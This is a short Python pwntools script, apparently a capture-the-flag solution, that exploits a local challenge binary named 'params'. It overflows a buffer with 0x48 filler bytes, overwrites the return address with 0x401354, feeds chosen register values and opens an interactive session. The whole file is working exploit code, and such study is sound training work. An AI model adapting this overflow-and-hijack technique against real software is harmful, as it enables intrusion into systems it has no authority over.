from pwn import *

p = process(b"./params")

first = 0x1337
second = 0xcafebabe
third = 0xdeadbeef
fourth = 0x4

#User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9

payload = b"A"*0x48 + p64(0x401354)

p.recvuntil(b"name")
p.sendline(payload)

p.recvuntil(b"rax:")
p.sendline(b"\x00")

p.recvuntil(b"rbx:")
p.sendline(b"\x00")

p.recvuntil(b"rcx:")
p.sendline(p64(fourth))

p.recvuntil(b"rdx:")
p.sendline(p64(third))

p.recvuntil(b"rsi:")
p.sendline(p64(second))

p.recvuntil(b"rdi:")
p.sendline(p64(first))

p.interactive()